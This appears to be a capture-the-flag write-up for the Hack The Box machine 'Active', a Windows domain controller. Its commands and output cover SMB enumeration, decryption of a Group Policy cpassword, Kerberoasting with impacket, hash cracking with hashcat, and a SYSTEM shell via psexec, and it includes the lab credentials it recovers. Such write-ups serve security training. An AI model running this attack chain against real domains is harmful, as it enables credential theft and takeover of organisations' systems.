## Default Information
IP Address: 10.10.10.100\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.140    active.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.100 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-20 01:17:34 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 59839/udp on 10.10.10.100                                 
Discovered open port 135/tcp on 10.10.10.100                                   
Discovered open port 53/udp on 10.10.10.100                                    
Discovered open port 139/tcp on 10.10.10.100                                   
Discovered open port 49158/tcp on 10.10.10.100                                 
Discovered open port 53/tcp on 10.10.10.100                                    
Discovered open port 58377/udp on 10.10.10.100                                 
Discovered open port 5722/tcp on 10.10.10.100                                  
Discovered open port 49171/tcp on 10.10.10.100                                 
Discovered open port 49157/tcp on 10.10.10.100                                 
Discovered open port 593/tcp on 10.10.10.100                                   
Discovered open port 636/tcp on 10.10.10.100                                   
Discovered open port 49152/tcp on 10.10.10.100                                 
Discovered open port 464/tcp on 10.10.10.100                                   
Discovered open port 58631/udp on 10.10.10.100                                 
Discovered open port 3269/tcp on 10.10.10.100                                  
Discovered open port 49165/tcp on 10.10.10.100                                 
Discovered open port 445/tcp on 10.10.10.100                                   
Discovered open port 3268/tcp on 10.10.10.100                                  
Discovered open port 49155/tcp on 10.10.10.100                                 
Discovered open port 49170/tcp on 10.10.10.100                                 
Discovered open port 47001/tcp on 10.10.10.100                                 
Discovered open port 389/tcp on 10.10.10.100                                   
Discovered open port 49153/tcp on 10.10.10.100                                 
Discovered open port 49154/tcp on 10.10.10.100                                 
Discovered open port 9389/tcp on 10.10.10.100                                  
Discovered open port 88/tcp on 10.10.10.100                                    
Discovered open port 60166/udp on 10.10.10.100  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

```
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-01-20 01:58:54Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49171/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
53/udp    open  domain        udp-response ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/udp    open  kerberos-sec  udp-response Microsoft Windows Kerberos (server time: 2022-01-20 01:32:55Z)
123/udp   open  ntp           udp-response ttl 127 NTP v3
| ntp-info: 
|_  receive time stamp: 2022-01-20T01:34:49
```

### Testing for DNS zone transfer on port 53
Using the dig command, we were only able to find 1 server associated with 10.10.10.100

```
┌──(kali㉿kali)-[~/Desktop]
└─$ dig AXFR -p 53 @10.10.10.100

; <<>> DiG 9.17.19-3-Debian <<>> AXFR -p 53 @10.10.10.100
; (1 server found)
;; global options: +cmd
;; Query time: 411 msec
;; SERVER: 10.10.10.100#53(10.10.10.100) (UDP)
;; WHEN: Thu Jan 20 04:32:34 EST 2022
;; MSG SIZE  rcvd: 40
```

Using the host command, we were unable to find any DNS zone transfer as we were unable to make any connection to 10.10.10.100

```
┌──(kali㉿kali)-[~/Desktop]
└─$ host -t axfr 10.10.10.100        
Trying "100.10.10.10.in-addr.arpa"
;; Connection to 192.168.147.2#53(192.168.147.2) for 100.10.10.10.in-addr.arpa. failed: connection refused.
Trying "100.10.10.10.in-addr.arpa"
;; Connection to 192.168.147.2#53(192.168.147.2) for 100.10.10.10.in-addr.arpa. failed: connection refused.
```
### SMB Enumeration on port 139 and 445.

First, let us use smbmap to enumerate the shares on the smb server on port 139 and 445. We realize that we are unable to authenticate to the smb server on port 139, but we are able to authenticate on the smb server on port 445. Apart from that, we also realize that we have read access to the Replication share on port 445.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.10.100 -P 139
[!] RPC Authentication error occurred
[!] Authentication error on 10.10.10.100
                                                                                                                     
┌──(kali㉿kali)-[~]
└─$ smbmap -H 10.10.10.100 -P 445
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```

Next, we will use smbclient to connect to the Replication shares on 10.10.10.100

```
┌──(kali㉿kali)-[~]
└─$ smbclient -N //10.10.10.100/Replication
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \>
```

## Exploit
### Decrypting cpassword
Looking through the files, we were able to find a Groups.xml file. 
```
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\> get Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml of size 533 as Groups.xml (0.3 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

Looking at the contents of the Groups.xml file, we are able to obtain some information about the local user in the Group Policy object. First of all, we are able establish that the username of the local user is ```active.htb\SVC_TGS```. Secondly, we are also able to extract the cpassword of the local user in the Group policy object.

```
┌──(kali㉿kali)-[~/Desktop/active]
└─$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Looking up this cpassword, we realize that there is a tool in Kali Linux that can decrypt this cpassword since Windows released the key that is needed to decrypt this password.
```
┌──(kali㉿kali)-[~/Desktop/active]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

### Obtaining user flag
Using the username and password that we have obtained earlier, we can use smbmap again to list the shares on the smb server. However, we realize that we now have READ ONLY access to Users directory.

```
┌──(kali㉿kali)-[~/Desktop/active]
└─$ smbmap -u SVC_TGS -p "GPPstillStandingStrong2k18" -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: active.htb                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

Next, we will use smbclient to connect to the Users share on the smb server with the username and password that we have obtained earlier.

```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18 
Try "help" to get a list of possible commands.
smb: \> 
```

Lastly, all that is left for us to do is to obtain the user flag.

```
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> 
--------------------------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~/Desktop/active]
└─$ cat user.txt        
<Redacted user flag>
```
### Kerboroasting

Unlike the Forest machine, we are not able obtain a list of users from the enum4linux script and so, we are unable to do As-Rep Roasting to obtain the credentials. 

However, since port 88 is a Kerboros server as since in our nmap output earlier, we can try to use the Kerberoasting attack to extract the credentials of service accounts for offline cracking of passwords.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS                                  
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2022-01-19 04:21:04.524944             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$abcbf8cd9fb4c6dbe848516fa2de1b05$ab4a0833b8431bc87aeab4f721c10f62c7cf97c79a036c4e186aeeafd5aed4cfa9273e220d1782623a0c35e2a3c9fcc5549ec29ab432c1d125301303402eb7847570eee94dfbd3b506db8977b380b9161088ee491e364d159080243f13ba0afa34600736cc694f9a11bed8248c4358d2d4ca9b05ca2151732e0277210eac0ab1fd9330bad8b49c73615628312592a5be9fb00a5be1a6f70d62f6812b52131931f53fa75fdcafb2468e4a5a518ea9e3bc49433fbe27e5ccee8b3248a61b9b1f7f6053d4a6ea2b56a6331a26d8e3bd5509286b762acdfcab3c7d3b665c7614651711dfd36438fe0bec255aa39da2eafe0fc42cf3b4dedec467fda41a7c08501ffefc1f5e5f85f62a31622db809bf4f0667383caa3cd754b6bfd0d813f2701e4887c41c08e5d6d4213f7694b7634320924e9f4b3124243856dfb155bc3fcc1d7ef1361eb58f3c347688111e585e8042c70b93d81a1e4139a079852487f9103eb35660d76c9bbee46b49948d6598ee9eab7dacc3a99333bfd083b9b6e79117de86483b5166183806888662e84a1521a5684afc8667ee56fd298c206cdaeedd156ce02daf6d19f21c74889cd08db51639c271eca806354b79c2b555d95c2785907bc1aa81bdb935b8a0d5af325bb5e1bd146b5f9cc251db4b0b19f3bb81beff5fbed8708c16678c87ae922cd805d821cc75a2a79e0a568588a3aca2c1aa93bed699e3263e4e286a4b8e179ca28167435c71f59260de23291a6af4c378529724a2266c444ae05b431464e2ba56b472a549810fb8fd4d577baa92e1f805309f8cb23f4f445e9e1f155edff7d195942feccc9d9d55000177dd80e58eb7aebdcaad2489b8cdf6158895b968bd0a3cb3fa96d05daa995e90a2f1b46252b8a817ab284d51ccb5dc587da14ad73a6e5f8e28ea7cc116e8f2dd00200c41fb2f0ea48e9af3220ebe23b5a11ebb5be1c1eeec1e722d24e38ed7dbaf77440c041fd9113bf092a2b2c67709706112814b6b8f448ac67eacc6063cab5660b203c32937c02eaefdaccc35e72b6646a2f665f0543bd0c80481692e9bf4dae64741b6e4f63f92b2eccbe31b99f1b7e6733ac93be49ac8146ba0283616e9a41ff14d119f2586201ebc97402fd6ff79aad2905563b62d9b6bdf8ebe3d9cccbfdb69148327d3c5815fa8b6f10762055c1e33f98a95e27641719ff19a3d5df1bb520b7f95eb6f45fdb5895aed8c19d9a10d7450e8da9e95d661d2f3da990c10b0db7b902f3b42
```

In the case, where we get an error ```Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)```, all we need to do is to synchronize the local time of the host machine with the DC.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo ntpdate 10.10.10.100                                                                        
20 Jan 08:52:09 ntpdate[2123]: step time server 10.10.10.100 offset +12.797698 sec
```

Lastly, we will use hashcat to decrypt the password hash that we have obtained. 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 13100 hashed.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt --force 
hashcat (v6.1.1) starting...
Dictionary cache hit:
* Filename..: /home/kali/Desktop/pentest/wordlist/rockyou.txt
* Passwords.: 14344382
* Bytes.....: 139922166
* Keyspace..: 14344382

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f19571b2c4ad4e8825ec1c79f929ba49$2f279da075d6a67e4bfb254d4f1be06af4a9bec48d7f73e8eb193fe670092d3247d30b57ab09bb96fce874b9455327b2e7015c2066ee791330ad758cb79bfcb90d4b7a2b669c30f6292dc3b0ecf3236d1ff6ba5ed7e12645ae604c3dc607c134c9681a3cceb6af4806f904080dc59927475d9609af3e97accafea6fc2595cfdc22c21cbfdface46d1b303334258e717813852160ee2b7593b1378a5a189139206dbcb77da4c0ba7869a3af72f8430584d3b5d1e6fbcdf70ae6fd71e4fc94bdcb62bf1d49df15073c7f75cdab705d234ac7d021f66deb56be47662d03c3cdd9deb605228cd3e9d49a0e29c6a662c8aa090de9b200a4a713f00a8d14796843182a507e56c26422a7fa2e39c4255c63b29dd50c907d92371896ce6da90a886ff739029df17448ea0bd1aa1ff12e4f82de59e52a28e0b356895f440a536d254555eb5828f918808aec4df4cdf971f7846a128bcca7c36dcb97d1106e3b6925fd0ed91be0030ac8c40c8e800ddd456132ab8d81ee77b1bac01fafc0d31876c0a8d1d431598afbb690e8b3106ec2498585cff0ee8d666b3aed7d5a05cd017555bf6de78842ddf2f53588c3621f02b3eb92ec1be4f09775fdb404a2ddca927126380d85de44699710669f8b39dba4e920855a1c6cb5c22b03ce275af71ade25c57aa9518ea5b9e58982b71877a6654d442c49c7a3301da96c8a1492de73d59481987267aa59ad613048bcf7d9cc3da831ca836bac86456b0a4cbe5d81cd8ad22d9442ad9ad98f98d0ab822e383c3755dd4ad4adad7ed3b92484feedc8d4dab6527f104caa449e3793844d56e426a9f859aaa3518bdb071c826ff22241e499996499e3e3f8e3df5db5989fc49ef3e0b3c440904893d75aabbf2c20d8132831144537c27484e40225a565f2576fb12bfcf88c56cd753499333b0828e352926a7fe4a404d7295ec1d1b5a1c7a6f1dedc0443dda081a1ccf9cdf9aa39f779705b3411ccf35899d40c0040210ab2268a59342417a53221bd18990a89372b3e348f3e1ca34897c8765ee0638ec1cb0e63aa45f2228de4b94baa6183c65b475cafc602273fe29247b60ceee33b1b60bc057d7a644aa90aeec2954f21c5f78373bffd8a981ef5f25f17e34994874e250ed33b050ae65bcad86acdf41cfa913c0a4b67186f17c3746fd014edb2619959d6d07da8c6a1cedb8e4437b0847f2ea8c25aba2d4d30cafebb9118cff531a094dbbe9bf631dc92a7708c02aa14721933c261:Ticketmaster1968
```

### Obtaining root flag

All that is left for us to do is to use smbclient to authenticate to the smb server with the administrator user.

```
┌──(kali㉿kali)-[~/Desktop/active]
└─$ smbclient //10.10.10.100/Users -U administrator%Ticketmaster1968
Try "help" to get a list of possible commands.
smb: \> 
```

Afterwards, all we have to do is to download the root flag to our local machine. 

```
smb: \Administrator\Desktop\> get root.txt
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Administrator\Desktop\> 
-------------------------------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~/Desktop/active]
└─$ cat root.txt        
<Redacted root flag>
```
## Post Exploitation
### What is Kerberoasting

*Referenced from: https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/*

Kerberoasting is a post-exploitation attack that extracts the service account credential hashes from the Active Directory for offline cracking. 

In the Active Directory, the Ticket-Granting-Ticket (TGT) is the user's authorization to request the ticket granting service (TGS) tickets for various domain resources. By design, these TGS tickets are normally encrypted with the service account's NTLM hashes. 

One thing to note is that kerberoasting only works against domain user Service Principal Names (SPN) and not host-based SPNs because host-based SPNs are secured with random 128-character passwords and are typically changed every 30 days. This makes it difficult to guess the passwords for these host-based SPNs. On the other hand, user account SPN passwords are generally choosen by humans and are almost unchanged which makes it easier for the password to be cracked.

Afterwhich comes in the limitation in the architecture design of the Kerboros authentication service. The problem of Kerboros authentication is that authenticated domain users can request a TGS ticket for any of the service on the network. However, the domain controller of the user that is controlling the user does not enforce if the user has sufficient privileges to access the service. Instead, this enforcement lies on the responsibility of the service to ensure that the user requesting for access to the service has sufficient privileges. 

The sequence of how a Kerberoasting attack works is as follows: \
1) An attacker must first compromise the account of a domain user. In this machine, we have compromised the account of the domain user ```SVC_TGS``` and is able to successfully authenticate to the domain.
2) The ```SVC_TGS``` user then receive a ticket granting ticket (TGT) from the Kerberos Key Distribution Centre that is signed by the KRBTGT serice in the Active Directory.
3) ```SVC_TGS``` user then requests for a service that they wish to compromise. The domain controller will then retrieve the permissions out of the Active Directory database and create a TGT ticket, encrypting it with the service's password.
4) The domain controller then provides the ```SVC_TGS``` user with the service ticket that is presented to the service which then decrypts the ticket and verifies if the user has the permission to access the service. At this point, the ```SVC_TGS``` user can extract the ticket from the system memory and crack the password offline. 

### Obtaining system shell

We are not able to use evil-winrm to obtain the system shell as ports 5985 and 5986 is not open. This means that winRM is not enabled on this machine, and so we will not be able to enter a remote session.

However, if we use smbmap to check the privileges of the administrator user on the shares, we would realize that the user has write permissions on some of the shares.

```
┌──(kali㉿kali)-[~]
└─$ smbmap -u administrator -p "Ticketmaster1968" -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: active.htb                                        
[/] Work[!] Unable to remove test directory at \\10.10.10.100\SYSVOL\MQLXGARECJ, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ, WRITE     Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ, WRITE     Logon server share 
        Users                                                   READ ONLY

```

This means that we can use impacket-psexec to obtain a system shell.

```
┌──(kali㉿kali)-[~]
└─$ impacket-psexec active.htb/administrator@10.10.10.100
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file PAHhxlZd.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service iMtY on 10.10.10.100.....
[*] Starting service iMtY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
 
C:\Windows\system32> 
```

Another alternative that we can use is impacket-smbexec. However for this, we are only launching a semi-interactive shell and some of the commands might not be available on the shell.

```
┌──(kali㉿kali)-[~]
└─$ impacket-smbexec active.htb/administrator@10.10.10.100 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

However, if we attempt to use impacket-psexec on ```SVC_TGS``` user, we would realize that we are unable to establish a connection. The reason for this is that the user does not have write privileges on all the shares on 10.10.10.100.

```
┌──(kali㉿kali)-[~]
└─$ impacket-psexec active.htb/SVC_TGS@10.10.10.100
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'Replication' is not writable.
[-] share 'SYSVOL' is not writable.
[-] share 'Users' is not writable.
```
